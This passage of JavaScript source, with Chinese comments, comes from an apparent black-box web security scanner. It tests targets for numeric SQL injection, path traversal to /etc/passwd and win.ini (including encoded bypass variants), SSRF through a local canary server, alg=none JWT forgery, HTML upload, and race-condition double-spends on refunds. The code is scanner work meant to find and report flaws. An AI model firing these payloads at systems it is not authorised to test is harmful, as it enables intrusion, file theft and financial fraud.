  const walk = (node, depth) => {
    if (node == null || depth > 3) return;
    if (Array.isArray(node)) {
      if (node.length === 0) sawEmptyList = true;
      return;
    }
    if (typeof node !== "object") return;
    for (const v of Object.values(node)) walk(v, depth + 1);
  };
  walk(j, 0);
  if (sawEmptyList) return 0;
  const keys = Object.keys(j);
  if (keys.length > 0 && !keys.every((k) => ["error", "message", "code", "detail"].includes(k))) return 1;
  return 0;
}

/**
 * 数字上下文注入：`WHERE id = ` 直接拼整数时，带引号的 payload 只会让查询报错或一律空手，
 * 字符串语境的四组用例判不出来——这是纯数字参数（id/页码/年份）常见的漏报面。
 * 用三段差分：必不存在的 ID 空手 → `1 OR 1=1` 放出数据 → `1 OR 1=2` 仍空手。
 * 只有条件真被求值才会出现「恒假空手、恒真有数据」；把非数字值当「不过滤」返回全量的实现
 * 会在恒假那步也返回全量，因此不误报。
 */
async function probeSqliNumericOnParam(ctx, baseUrl, route, param, identity, budget) {
  if (budget.remaining < 3) return null;
  const basePath = route.path;
  const sep = basePath.includes("?") ? "&" : "?";
  const url = (v) => `${basePath}${sep}${encodeURIComponent(param)}=${v}`;
  const send = async (payload) => {
    budget.remaining -= 1;
    return httpJson(ctx, { baseUrl, method: "GET", path: url(encodeURIComponent(payload)), identity });
  };

  const miss = await send("999999");
  if (miss.status === 0) return null;
  if (rowCount(miss) > 0 && isOk(miss.status)) return null; // 基线就有数据：无法把后续差异归因给注入

  const always = await send("1 OR 1=1");
  const never = await send("1 OR 1=2");
  const a = rowCount(always);
  const n = rowCount(never);
  if (a <= 0 || n > 0) return null;
  return makeRecord(ctx, baseUrl, {
    caseId: `blackbox-sqli-numeric-${slug(`${basePath}:${param}`)}`,
    name: `黑盒·SQL 注入（数字条件绕过）${basePath} 参数 ${param}`,
    method: "GET",
    path: url(encodeURIComponent("1 OR 1=1")),
    identity,
    res: always,
    expectation: "数字参数不得作为 SQL 条件片段拼接",
    verdict: VERDICT.VULNERABLE,
    actual: `必不存在的 ID 空手（HTTP ${miss.status}），${param}=1 OR 1=1 得 ${a} 条，${param}=1 OR 1=2 得 ${n} 条`,
    impact: "SQL 注入（数字上下文，可放开 WHERE 条件）",
  });
}

async function probeSqli(ctx, baseUrl, routes, identity, limit = MAX_PROBE_ROUTES) {
  const records = [];
  const budget = { remaining: MAX_SQLI_REQUESTS };
  const numericBudget = { remaining: MAX_SQLI_NUMERIC_REQUESTS };
  const probeRoutes = getRoutesForProbing(routes, limit);
  const exhausted = (kind, used) => {
    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.INFO,
      message: `黑盒 SQLi ${kind}请求预算（${used}）已用尽，跳过剩余参数`,
      data: { budget: used },
    });
  };

  // 先跑完字符串语境再跑数字语境：两类判据互不覆盖，若在同一参数上交替进行，
  // 数字用例会把预算吃在列表前几条路由上，让后面的真实字符串注入点直接漏报。
  for (const route of probeRoutes) {
    for (const { name, declared } of sqliParams(route)) {
      if (budget.remaining < 3) {
        exhausted("字符串语境", MAX_SQLI_REQUESTS);
        return records;
      }
      const rec = await probeSqliOnParam(ctx, baseUrl, route, name, identity, budget, declared);
      if (rec) {
        records.push(rec);
        emitRecord(ctx, rec);
      }
    }
  }

  for (const route of probeRoutes) {
    const declared = (route.queryParams ?? []).filter((n) => typeof n === "string" && n.length > 0);
    // 无规格目标补 `id`：真实数字注入点几乎都叫它，而猜词表里的 q/query 打不进它
    const params = (declared.length ? declared : [...GUESSED_PARAMS, "id"]).slice(0, MAX_PARAMS_PER_ROUTE + 1);
    for (const name of params) {
      if (numericBudget.remaining < 3) {
        exhausted("数字语境", MAX_SQLI_NUMERIC_REQUESTS);
        return records;
      }
      const numeric = await probeSqliNumericOnParam(ctx, baseUrl, route, name, identity, numericBudget);
      if (numeric) {
        records.push(numeric);
        emitRecord(ctx, numeric);
        break;
      }
    }
  }
  return records;
}

// 编码变体不是「多试几个」：只做一遍归一化的过滤器会吃掉明文 `../`，却在二次解码前放过
// `..%252f`（先解成 `..%2f`，再被应用自己解一次才越界）；`....//` 与过长 UTF-8 同理。
// 只带明文 payload 的探测面对这类目标是漏报。
const TRAVERSAL_PAYLOADS = [
  "../../../../etc/passwd",
  "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
  "..\\..\\..\\..\\windows\\win.ini",
  "..%252f..%252f..%252f..%252fetc%252fpasswd",
  "....//....//....//....//etc/passwd",
  "%c0%ae%c0%ae%c0%ae%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
];
const TRAVERSAL_SIGNATURES = ["root:x:", "[fonts]", "[extensions]", "/bin/bash"];
const TRAVERSAL_TEMPLATES = ["/api/files/{p}", "/files/{p}", "/static/{p}", "/download/{p}", "/api/download/{p}"];
// 无 OpenAPI 声明的目标：文件读取参数几乎都叫这几个名字，按常见命名打一遍才有机会命中
const GUESSED_FILE_PARAMS = ["file", "path", "name"];

async function probeTraversal(ctx, baseUrl, identity, routes = [], limit = MAX_PROBE_ROUTES) {
  const records = [];
  const tried = new Set();
  const hit = (body) => TRAVERSAL_SIGNATURES.find((s) => body.includes(s));

  const report = async (path, res, signature, label) => {
    if (tried.has(path)) return;
    tried.add(path);
    const rec = makeRecord(ctx, baseUrl, {
      caseId: `blackbox-traversal-${slug(path)}`,
      name: `黑盒·路径穿越 ${label}`,
      method: "GET",
      path,
      identity,
      res,
      expectation: "文件读取参数不得越出允许目录",
      verdict: VERDICT.VULNERABLE,
      actual: `响应包含系统文件特征：${signature}`,
      impact: "任意文件读取",
    });
    records.push(rec);
    emitRecord(ctx, rec);
  };

  // 模板路径与声明参数共用一份配额：穿越探测的请求量对目标可见，不能各花各的
  let budget = MAX_TRAVERSAL_REQUESTS;

  for (const tpl of TRAVERSAL_TEMPLATES) {
    for (const p of TRAVERSAL_PAYLOADS) {
      if (budget < 1) return records;
      const path = tpl.replace("{p}", p);
      if (tried.has(path)) continue;
      const res = await httpJson(ctx, { baseUrl, method: "GET", path, identity });
      budget -= 1;
      const signature = hit(res.body ?? "");
      if (!signature) continue;
      await report(path, res, signature, path);
      break;
    }
  }

  // 已声明的查询参数：文件读取类参数（如 ?datestamp=/?file=）只有把 payload 打到真实参数名上才能复现
  const targets = routes.filter((r) => r.method === "GET");
  const probeList = targets.some((r) => r.queryParams?.length)
    ? getRoutesForProbing(targets.filter((r) => r.queryParams?.length), limit)
    : [];
  // 没有 OpenAPI 声明的目标也要能测：文件读取参数几乎都叫这几个名字，但只对「名字像读文件」
  // 且真实存在（非 404 占位）的端点猜参，否则预算全花在订单接口上收不回来。
  const looksLikeFileRead = (p) => (/(file|download|document|attachment|export|template|preview|static|asset|image|read|view)/i.test(p) ? 0 : 1);
  const fallback = probeList.length
    ? []
    : getRoutesForProbing(
        targets.filter(
          // 只猜真实存在、且名字像读文件的端点：对 404 占位或订单接口灌穿越串是噪声不是覆盖
          (r) => r.status !== 404 && looksLikeFileRead(r.path) === 0
        ),
        limit
      ).map((r) => ({ route: r, params: GUESSED_FILE_PARAMS }));
  const work = [
    ...probeList.map((r) => ({ route: r, params: (r.queryParams ?? []).slice(0, MAX_PARAMS_PER_ROUTE) })),
    ...fallback,
  ];
  for (const { route, params } of work) {
    for (const param of params) {
      if (budget < TRAVERSAL_PAYLOADS.length) {
        ctx.emit({
          kind: "discovery",
          severity: SEVERITY.INFO,
          message: `黑盒路径穿越请求预算（${MAX_TRAVERSAL_REQUESTS}）已用尽，跳过剩余参数`,
          data: { budget: MAX_TRAVERSAL_REQUESTS, route: route.path, param },
        });
        return records;
      }
      const sep = route.path.includes("?") ? "&" : "?";
      for (const p of TRAVERSAL_PAYLOADS) {
        const path = `${route.path}${sep}${encodeURIComponent(param)}=${p}`;
        if (tried.has(path)) continue;
        const res = await httpJson(ctx, { baseUrl, method: "GET", path, identity });
        budget -= 1;
        const signature = hit(res.body ?? "");
        if (!signature) continue;
        await report(path, res, signature, `${route.path} 参数 ${param}`);
        break;
      }
    }
  }
  return records;
}

// ---------- SSRF / 上传 / JWT / 业务逻辑（黑盒动态取证） ----------
// 这四族在黑盒里没有源码线索，只能靠「路径与参数命名 → 无害载荷 → 外部可观测证据」取证：
// 回连本机 canary、同源回读上传令牌、响应回显伪造身份、状态确实被跳过或副作用出现两次。
// 任何一步拿不到证据都只记 inconclusive，不把「看起来像」当成漏洞。

const SSRF_CANARY_PATH = "/gb-ssrf/";
const MAX_SSRF_ROUTES = 6;
const MAX_SSRF_PARAMS = 3;
const MAX_SSRF_REQUESTS = 48;
const SSRF_PATH_GUESSES = [
  "/api/preview", "/api/fetch", "/api/proxy", "/api/url", "/api/link-preview",
  "/api/image", "/api/screenshot", "/api/render", "/api/import", "/api/webhook",
];
const SSRF_PARAM_GUESSES = ["url", "uri", "target", "src", "link", "redirect"];

function startSsrfCanary() {
  return new Promise((resolve, reject) => {
    const token = shortId("ssrf");
    const hits = [];
    const server = createServer((req, res) => {
      hits.push({ url: req.url ?? "", at: Date.now() });
      res.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
      res.end(`guardbuild-ssrf-canary:${token}`);
    });
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      resolve({
        token,
        hits,
        url: `http://127.0.0.1:${server.address().port}${SSRF_CANARY_PATH}${token}`,
        close: () => new Promise((r) => server.close(() => r())),
      });
    });
  });
}

async function waitForCanaryHit(canary, timeoutMs = 700) {
  const until = Date.now() + timeoutMs;
  const matched = () => canary.hits.filter((h) => h.url.includes(canary.token)).length;
  while (Date.now() < until) {
    if (matched() > 0) break;
    await new Promise((r) => setTimeout(r, 50));
  }
  return matched();
}

/**
 * SSRF：只把 canary URL 交给「名字像拉取远端资源」的参数。命中回连即成立；
 * 被服务端拒绝记 blocked；200 但无回连只记 inconclusive（参数可能被忽略）。
 * 目标在容器里时访问不到宿主回环，此时不会命中，属于已知边界。
 */
async function probeSsrf(ctx, baseUrl, routes, identity, limit = MAX_SSRF_ROUTES) {
  const records = [];
  const candidates = [];
  const seen = new Set();
  const push = (path, params) => {
    if (seen.has(path) || hasTemplate(path)) return;
    seen.add(path);
    candidates.push({ path, params: params.slice(0, MAX_SSRF_PARAMS) });
  };
  for (const r of routes) {
    if (r.method !== "GET" || r.status === 404) continue;
    const declared = (r.queryParams ?? []).filter((p) => typeof p === "string" && p);
    if (declared.length) push(r.path, declared);
  }
  for (const p of SSRF_PATH_GUESSES) push(p, SSRF_PARAM_GUESSES);

  const canary = await startSsrfCanary();
  let budget = MAX_SSRF_REQUESTS;
  let hits = 0;
  try {
    for (const { path, params } of candidates.slice(0, limit)) {
      for (const param of params) {
        if (budget < 1) return records;
        const sep = path.includes("?") ? "&" : "?";
        const attackPath = `${path}${sep}${encodeURIComponent(param)}=${encodeURIComponent(canary.url)}`;
        const res = await httpJson(ctx, { baseUrl, method: "GET", path: attackPath, identity });
        budget -= 1;
        if (res.status === 0) continue;
        // 路径本身不存在：不再为这条路径猜其余参数
        if (res.status === 404 || res.status === 405) break;
        hits = await waitForCanaryHit(canary);
        const base = {
          caseId: `blackbox-ssrf-${slug(path)}`,
          name: `黑盒·SSRF 服务端请求伪造 ${path}${param ? ` · 参数 ${param}` : ""}`,
          method: "GET",
          path: attackPath,
          identity,
          expectation: "服务端不得按请求参数访问任意地址（应校验协议与主机白名单）",
        };
        if (hits > 0) {
          const rec = makeRecord(ctx, baseUrl, {
            ...base,
            res,
            verdict: VERDICT.VULNERABLE,
            actual: `服务端回连本机 canary（${canary.url}，命中 ${hits} 次）：请求 URL 由攻击者完全控制`,
            grade: "strong",
            crossProof: `独立 canary 监听收到带随机令牌 ${canary.token} 的回连请求`,
            impact: "可诱导服务端访问内网服务/云元数据或任意外部地址",
          });
          records.push(rec);
          emitRecord(ctx, rec);
          return records;
        }
        if (isDenied(res.status) || res.status === 400 || res.status === 422 || res.status === 409) {
          const rec = makeRecord(ctx, baseUrl, {
            ...base,
            res,
            verdict: VERDICT.BLOCKED,
            actual: `HTTP ${res.status}，携带 canary URL 的请求被拒绝，未观测到回连`,
            grade: "http-only",
          });
          records.push(rec);
          emitRecord(ctx, rec);
          break;
        }
        if (res.ok) {
          const rec = makeRecord(ctx, baseUrl, {
            ...base,
            res,
            verdict: VERDICT.INCONCLUSIVE,
            actual: `HTTP ${res.status}，未观测到 canary 回连（参数可能被忽略或已有主机白名单）`,
            grade: "http-only",
          });
          records.push(rec);
          emitRecord(ctx, rec);
          break;
        }
        break;
      }
    }
  } finally {
    await canary.close();
  }
  return records;
}

// —— JWT 伪造：alg=none 与无效 HS256 签名。黑盒不读源码、不猜弱密钥（那是字典攻击）。 ——
const MAX_JWT_ROUTES = 6;
const JWT_PATH_GUESSES = ["/api/me", "/api/auth/me", "/api/profile", "/api/user", "/api/users/me", "/api/admin/users", "/api/admin"];

function b64urlJson(obj) {
  return Buffer.from(JSON.stringify(obj)).toString("base64url");
}

function jwtForgeClaims(marker) {
  const now = Math.floor(Date.now() / 1000);
  return {
    sub: marker,
    username: marker,
    name: marker,
    email: `${marker}@gb.local`,
    role: "admin",
    iat: now,
    exp: now + 3600,
  };
}

function jwtForgeNone(marker) {
  return `${b64urlJson({ alg: "none", typ: "JWT" })}.${b64urlJson(jwtForgeClaims(marker))}.`;
}

function jwtForgeGarbage(marker) {
  const body = `${b64urlJson({ alg: "HS256", typ: "JWT" })}.${b64urlJson(jwtForgeClaims(marker))}`;
  return `${body}.Z2ItZm9yZ2VkLXNpZ25hdHVyZQ`;
}

/** JWT：匿名被拒的受保护端点才测；伪造令牌被接受且响应回显攻击者身份才算漏洞。 */
async function probeJwt(ctx, baseUrl, routes, limit = MAX_JWT_ROUTES) {
  const records = [];
  const candidates = [];
  const seen = new Set();
  const push = (p) => {
    if (!p || seen.has(p) || hasTemplate(p)) return;
    seen.add(p);
    candidates.push(p);
  };
  for (const p of JWT_PATH_GUESSES) push(p);
  for (const r of getRoutesForProbing(routes, 40)) push(r.path);

  for (const path of candidates.slice(0, limit)) {
    const anon = await httpJson(ctx, { baseUrl, method: "GET", path });
    if (!isDenied(anon.status) || anon.status === 404) continue;
    const marker = `gbjwt${shortId("f").replace(/[^a-z0-9]/gi, "")}`;
    const attempts = [];
    let hit = null;
    let acceptedWithoutEcho = null;
    let last = anon;
    for (const v of [
      { alg: "alg=none", token: jwtForgeNone(marker) },
      { alg: "HS256(签名无效)", token: jwtForgeGarbage(marker) },
    ]) {
      const res = await httpJson(ctx, {
        baseUrl,
        method: "GET",
        path,
        headers: { Authorization: `Bearer ${v.token}` },
      });
      last = res;
      const echo = String(res.body ?? "").includes(marker);
      attempts.push({ alg: v.alg, status: res.status, markerEcho: echo });
      if (isOk(res.status) && echo) {
        hit = { res, alg: v.alg };
        break;
      }
      if (isOk(res.status) && !acceptedWithoutEcho) acceptedWithoutEcho = { res, alg: v.alg };
    }
    const chosen = hit?.res ?? last;
    const tried = attempts.map((a) => `${a.alg}:${a.status || "ERR"}`).join("、");
    const rec = makeRecord(ctx, baseUrl, {
      caseId: `blackbox-jwt-${slug(path)}`,
      name: `黑盒·JWT 伪造令牌 ${path}${hit ? ` · ${hit.alg}` : ""}`,
      method: "GET",
      path,
      identity: null,
      res: chosen,
      expectation: "受认证端点必须校验 JWT 算法与签名，拒绝 alg=none 与无效签名令牌",
      verdict: hit
        ? VERDICT.VULNERABLE
        : attempts.every((a) => isDenied(a.status))
          ? VERDICT.BLOCKED
          : VERDICT.INCONCLUSIVE,
      actual: hit
        ? `HTTP ${chosen.status}，${hit.alg} 伪造令牌通过认证；响应回显伪造身份 ${marker}`
        : acceptedWithoutEcho
          ? `HTTP ${chosen.status}，${acceptedWithoutEcho.alg} 伪造令牌被接受但响应未回显伪造身份，无法证明令牌来源（尝试：${tried}）`
          : `HTTP ${chosen.status}，伪造令牌未取得可判定证据（尝试：${tried}）`,
      grade: hit ? "strong" : "http-only",
      crossProof: hit ? `伪造令牌声明身份 ${marker}，服务端响应回显同一身份：签名校验被绕过` : null,
      impact: hit ? "可伪造任意用户/管理员身份通过认证" : null,
      reqHeaders: { Authorization: "Bearer <forged-jwt>" },
    });
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

// —— 文件上传：只上传仅含随机令牌的无害 HTML，再以同源 GET 回读 ——
const MAX_UPLOAD_ROUTES = 6;
const UPLOAD_PATH_GUESSES = [
  "/api/upload", "/api/uploads", "/api/avatar", "/api/files", "/api/file",
  "/api/attachments", "/api/media", "/api/images", "/api/photo", "/api/profile/avatar",
];
const UPLOAD_FIELDS = ["file", "avatar", "upload", "image"];
const UPLOAD_ACTIVE_TYPES = new Set(["text/html", "application/xhtml+xml", "image/svg+xml", "application/javascript", "text/javascript"]);
const UPLOAD_LOCATION_KEYS = ["url", "href", "path", "location", "fileUrl", "file_url", "src"];

function multipartUpload(field, filename, contentType, content, token) {
  const safeField = String(field ?? "file").replace(/[^A-Za-z0-9_.-]/g, "") || "file";
  const boundary = `----GuardBuild${token}`;
  const body = [
    `--${boundary}`,
    `Content-Disposition: form-data; name="${safeField}"; filename="${filename}"`,
    `Content-Type: ${contentType}`,
    "",
    content,
    `--${boundary}--`,
    "",
  ].join("\r\n");
  return { body, contentType: `multipart/form-data; boundary=${boundary}`, field: safeField };
}

function uploadLocationFrom(res, baseUrl) {
  const direct = headerOf(res, "location") ?? headerOf(res, "x-file-url") ?? headerOf(res, "x-upload-url");
  const candidates = [direct];
  for (const obj of [res?.json, res?.json?.data, res?.json?.file, res?.json?.result, res?.json?.data?.file]) {
    if (!obj || typeof obj !== "object") continue;
    for (const key of UPLOAD_LOCATION_KEYS) {
      if (typeof obj[key] === "string") candidates.push(obj[key]);
    }
  }
  for (const loc of candidates) {
    if (!loc || typeof loc !== "string" || loc.length > 500) continue;
    try {
      const abs = new URL(loc, baseUrl);
      if (abs.origin !== new URL(baseUrl).origin) continue;
      return `${abs.pathname}${abs.search}`;
    } catch {
      /* 非法地址忽略 */
    }
  }
  return null;
}

/** 上传接口常见命名猜词，加上 OpenAPI 里声明的 POST 上传端点（受 allowMutation 门控）。 */
function uploadCandidates(routes) {
  const out = [];
  const seen = new Set();
  const push = (p, source) => {
    if (!p || seen.has(p) || hasTemplate(p)) return;
    seen.add(p);
    out.push({ path: p, source });
  };
  for (const r of routes) {
    if (r.method === "POST" && /(upload|avatar|attachment|media|image|photo|file)/i.test(r.path)) push(r.path, "openapi");
  }
  for (const p of UPLOAD_PATH_GUESSES) push(p, "guess");
  return out;
}

async function probeUpload(ctx, baseUrl, routes, identity, limit = MAX_UPLOAD_ROUTES) {
  const records = [];
  for (const { path } of uploadCandidates(routes).slice(0, limit)) {
    const token = `gbupload${shortId("u").replace(/[^a-z0-9]/gi, "")}`;
    const filename = `gb-${token}.html`;
    const content = `<div data-gb-upload="${token}">${token}</div>`;
    let res = null;
    let form = null;
    for (const field of UPLOAD_FIELDS) {
      form = multipartUpload(field, filename, "text/html", content, token);
      res = await httpJson(ctx, {
        baseUrl,
        method: "POST",
        path,
        identity,
        body: form.body,
        contentType: form.contentType,
      });
      if (res.status === 0 || res.status === 404 || res.status === 405) break;
      // 字段名不对时很多框架返回 400/422 并点名字段，换下一个常见字段名再试
      if (!isOk(res.status) && /field|字段|filename|file/i.test(res.body ?? "") && UPLOAD_FIELDS.indexOf(field) < UPLOAD_FIELDS.length - 1) {
        continue;
      }
      break;
    }
    if (!res || res.status === 0 || res.status === 404 || res.status === 405) continue;

    const caseId = `blackbox-upload-${slug(path)}`;
    const base = {
      caseId,
      name: `黑盒·文件上传（主动内容）${path}`,
      method: "POST",
      path,
      identity,
      body: `multipart/form-data · 字段 ${form?.field ?? "file"} · 文件 ${filename}（仅含随机令牌）`,
      expectation: "上传接口应校验类型/内容，且不得以可渲染类型同源公开回读攻击者控制的文件",
    };
    if (!isOk(res.status)) {
      // 只有「服务端明确理解上传并拒绝类型」才算 blocked；401/403 可能只是路径不存在或无权限
      if ([400, 413, 415, 422, 409].includes(res.status)) {
        const rec = makeRecord(ctx, baseUrl, {
          ...base,
          res,
          verdict: VERDICT.BLOCKED,
          actual: `HTTP ${res.status}，上传被拒绝：${String(res.body ?? "").slice(0, 120)}`,
          grade: "http-only",
        });
        records.push(rec);
        emitRecord(ctx, rec);
      }
      continue;
    }

    const location = uploadLocationFrom(res, baseUrl);
    const readPaths = [...new Set([location, `/uploads/${encodeURIComponent(filename)}`, `/files/${encodeURIComponent(filename)}`].filter(Boolean))].slice(0, 2);
    let readRes = null;
    let readPath = null;
    for (const p of readPaths) {
      readRes = await httpJson(ctx, { baseUrl, method: "GET", path: p });
      if (isDenied(readRes.status)) readRes = await httpJson(ctx, { baseUrl, method: "GET", path: p, identity });
      if (readRes.status > 0 && readRes.status !== 404) {
        readPath = p;
        break;
      }
    }
    const body = String(readRes?.body ?? "");
    const contentType = String(headerOf(readRes, "content-type") ?? "").toLowerCase();
    const disposition = String(headerOf(readRes, "content-disposition") ?? "").toLowerCase();
    const echoed = body.includes(token);
    const activeType = [...UPLOAD_ACTIVE_TYPES].some((t) => contentType.includes(t));
    const attachment = disposition.includes("attachment");

    if (readRes?.ok && echoed && activeType && !attachment) {
      const rec = makeRecord(ctx, baseUrl, {
        ...base,
        res,
        verdict: VERDICT.VULNERABLE,
        actual: `上传被接受（HTTP ${res.status}），文件 ${readPath} 以 ${contentType} 同源回读且含令牌 ${token}：服务端公开提供攻击者控制的主动内容`,
        grade: "cross-proven",
        crossProof: `上传响应 + 同源回读内容同时命中随机令牌 ${token}`,
        impact: "可上传 HTML/SVG 等主动内容并被同源渲染（存储型 XSS/钓鱼页面）",
      });
      records.push(rec);
      emitRecord(ctx, rec);
      continue;
    }
    if (readRes?.ok && echoed && (attachment || !activeType)) {
      const rec = makeRecord(ctx, baseUrl, {
        ...base,
        res,
        verdict: VERDICT.BLOCKED,
        actual: `上传被接受，但回读为 ${contentType || "未知类型"}${attachment ? " + attachment" : ""}（非主动渲染）`,
        grade: "http-only",
      });
      records.push(rec);
      emitRecord(ctx, rec);
      continue;
    }
    const rec = makeRecord(ctx, baseUrl, {
      ...base,
      res,
      verdict: VERDICT.INCONCLUSIVE,
      actual: `上传被接受（HTTP ${res.status}），但未能在同源回读到令牌（尝试 ${readPaths.join("、") || "无地址"}）`,
      grade: "http-only",
    });
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

// —— 业务逻辑 / 竞态：状态跳步以回读状态变化为准，重复执行以出现多个副作用标识为准 ——
const MAX_BIZ_LISTS = 3;
const MAX_BIZ_ACTIONS = 6;
const RACE_CONCURRENCY = 5;
const PENDING_STATES = new Set(["pending", "draft", "new", "created", "unpaid", "open", "awaiting", "queued", "requested"]);
const READY_STATES = new Set(["paid", "active", "approved", "confirmed"]);
const STATE_ACTIONS = ["ship", "approve", "complete", "publish", "activate", "confirm", "close"];
const RACE_ACTIONS = ["refund", "payout", "withdraw", "transfer", "claim", "redeem", "checkout"];
const EFFECT_ID_KEY = /^(?:refund|transaction|txn|transfer|payout|withdrawal|claim|receipt|ledger)_?id$/i;

function firstEffectId(json) {
  const walk = (node, depth) => {
    if (!node || depth > 4) return null;
    if (Array.isArray(node)) {
      for (const v of node) {
        const hit = walk(v, depth + 1);
        if (hit) return hit;
      }
      return null;
    }
    if (typeof node !== "object") return null;
    for (const [k, v] of Object.entries(node)) {
      if (EFFECT_ID_KEY.test(k) && (typeof v === "string" || typeof v === "number") && String(v).length > 0) {
        return String(v);
      }
      const hit = walk(v, depth + 1);
      if (hit) return hit;
    }
    return null;
  };
  return walk(json, 0);
}

/** 状态跳步 / 并发双花只在 allowMutation 下执行；资金类动作（refund 等）还要 allowDestructive。 */
async function probeBizLogic(ctx, baseUrl, routes, { identity, destructive = false }, limit = MAX_BIZ_LISTS) {
  const records = [];
  const lists = [];
  for (const r of getRoutesForProbing(routes, 40)) {
    if (lists.length >= limit) break;
    if (hasTemplate(r.path) || r.status === 404) continue;
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: r.path, identity });
    if (!res.ok) continue;
    const items = extractItems(res.json).filter((o) => extractId(o) != null && o.status != null);
    if (items.length) lists.push({ path: r.path.replace(/\/+$/, ""), items });
  }

  for (const { path, items } of lists) {
    const statusOf = (o) => String(o.status ?? "").toLowerCase();
    const readBack = async (id) => {
      const res = await httpJson(ctx, { baseUrl, method: "GET", path, identity });
      if (!res.ok) return null;
      return extractItems(res.json).find((o) => String(extractId(o)) === String(id)) ?? null;
    };
    const wrong = items.find((o) => PENDING_STATES.has(statusOf(o)));
    const ready = items.find((o) => READY_STATES.has(statusOf(o)));

    if (wrong) {
      const id = extractId(wrong);
      const from = String(wrong.status);
      for (const action of STATE_ACTIONS.slice(0, MAX_BIZ_ACTIONS)) {
        const actionPath = `${path}/${encodeURIComponent(id)}/${action}`;
        const res = await httpJson(ctx, { baseUrl, method: "POST", path: actionPath, identity, body: {} });
        if (res.status === 0 || res.status === 404 || res.status === 405 || res.status === 403) continue;
        const after = isOk(res.status) ? await readBack(id) : null;
        const to = after?.status != null ? String(after.status) : null;
        const caseId = `blackbox-biz-state-${slug(actionPath)}`;
        if (isOk(res.status) && to && to !== from) {
          const rec = makeRecord(ctx, baseUrl, {
            caseId,
            name: `黑盒·状态跳步（${action}）${actionPath}`,
            method: "POST",
            path: actionPath,
            identity,
            body: {},
            res,
            expectation: "业务流转必须校验前置状态，不得从待处理状态直接跳到完成态",
            verdict: VERDICT.VULNERABLE,
            actual: `对象 #${id} 原状态 ${from}，调用 ${action} 后回读为 ${to}（HTTP ${res.status}）：前置状态校验缺失`,
            grade: "cross-proven",
            crossProof: `动作请求 + 按归属回读确认状态由 ${from} 变为 ${to}`,
            impact: "可跳过支付/审批等前置状态直接推进业务",
          });
          records.push(rec);
          emitRecord(ctx, rec);
          break;
        }
        if ([409, 422, 400].includes(res.status)) {
          const rec = makeRecord(ctx, baseUrl, {
            caseId,
            name: `黑盒·状态跳步（${action}）${actionPath}`,
            method: "POST",
            path: actionPath,
            identity,
            body: {},
            res,
            expectation: "业务流转必须校验前置状态",
            verdict: VERDICT.BLOCKED,
            actual: `HTTP ${res.status}，对象 #${id} 处于 ${from}，流转被拒绝`,
            grade: "http-only",
          });
          records.push(rec);
          emitRecord(ctx, rec);
          break;
        }
        if (isOk(res.status)) break; // 接受但状态未变：不继续猜动作
      }
    }

    if (ready && destructive) {
      const id = extractId(ready);
      for (const action of RACE_ACTIONS.slice(0, MAX_BIZ_ACTIONS)) {
        const actionPath = `${path}/${encodeURIComponent(id)}/${action}`;
        const results = await Promise.all(
          Array.from({ length: RACE_CONCURRENCY }, () =>
            httpJson(ctx, { baseUrl, method: "POST", path: actionPath, identity, body: {} }).catch((e) => ({
              status: 0,
              json: null,
              error: String(e?.message ?? e).slice(0, 160),
            }))
          )
        );
        if (results.every((r) => r.status === 404 || r.status === 405)) continue;
        const successes = results.filter((r) => isOk(r.status)).length;
        const effectIds = [...new Set(results.map((r) => firstEffectId(r.json)).filter(Boolean))];
        const statuses = results.map((r) => r.status || "ERR").join("/");
        const chosen = results.find((r) => isOk(r.status)) ?? results[results.length - 1];
        const caseId = `blackbox-biz-race-${slug(actionPath)}`;
        const rec = makeRecord(ctx, baseUrl, {
          caseId,
          name: `黑盒·并发双花（${action}）${actionPath}`,
          method: "POST",
          path: actionPath,
          identity,
          body: {},
          res: chosen,
          expectation: "一次性动作必须幂等/加锁，并发提交只允许一次成功",
          verdict:
            successes >= 2 && effectIds.length >= 2
              ? VERDICT.VULNERABLE
              : successes === 1 || results.every((r) => isDenied(r.status))
                ? VERDICT.BLOCKED
                : VERDICT.INCONCLUSIVE,
          actual:
            successes >= 2 && effectIds.length >= 2
              ? `并发 ${RACE_CONCURRENCY} 次 ${action}，${successes} 次成功且产生 ${effectIds.length} 个不同副作用标识（${effectIds.slice(0, 3).join("、")}）：同一操作被重复执行`
              : successes === 1
                ? `并发 ${RACE_CONCURRENCY} 次 ${action} 仅 1 次成功（状态：${statuses}）：一次性动作被串行化或幂等保护`
                : `并发 ${RACE_CONCURRENCY} 次 ${action} 结果不可判定（状态：${statuses}）`,
          grade: successes >= 2 && effectIds.length >= 2 ? "cross-proven" : "http-only",
          crossProof:
            effectIds.length >= 2
              ? `并发请求返回 ${effectIds.length} 个不同副作用标识（${effectIds.slice(0, 3).join("、")}）`
              : null,
          impact: effectIds.length >= 2 ? "可并发重复执行退款/领取/转账等一次性操作，造成资金双花" : null,
        });
        records.push(rec);
        emitRecord(ctx, rec);
        break;
      }
    }
  }
  return records;
}

function summarize(records, routes, login) {
  const counts = { vulnerable: 0, blocked: 0, passed: 0, regressed: 0, inconclusive: 0 };
  for (const r of records) counts[r.verdict] = (counts[r.verdict] ?? 0) + 1;
  const grades = { strong: 0, "cross-proven": 0, "http-only": 0 };
  for (const r of records) grades[r.evidenceGrade] = (grades[r.evidenceGrade] ?? 0) + 1;
  return {
    phase: "blackbox",
    routeCount: routes.length,
    total: records.length,
    counts,
    grades,
    attackRepro: counts.vulnerable,
    attackBlocked: counts.blocked,
    attackRegressed: counts.regressed,
    businessPassed: 0,
    businessTotal: 0,
    login,
  };
}

/** 黑盒扫描主入口：所有请求均经 Host，返回证据记录（已落库）+ 漏洞清单。 */
export async function runBlackbox(ctx, baseUrl, options = {}) {
  const routeCap = resolveRouteCap(options);
  const probeCap = resolveProbeCap(routeCap);
  ctx.emit({
    kind: "phase",
    severity: SEVERITY.INFO,
    message: `开始黑盒外部扫描：${baseUrl}（路由上限 ${routeCap}，每类探测最多 ${probeCap} 条）`,
    phase: "blackbox",
    data: { routeCap, probeCap, configured: options?.config?.blackbox?.maxRoutes ?? null },
  });

  // 可达性预检：不可达时每条探测都会等连接超时，必须先短路，避免整轮扫描拖成分钟级。
  const health = await httpJson(ctx, { baseUrl, method: "GET", path: "/", timeoutMs: 4_000 });
  if (health.status === 0) {
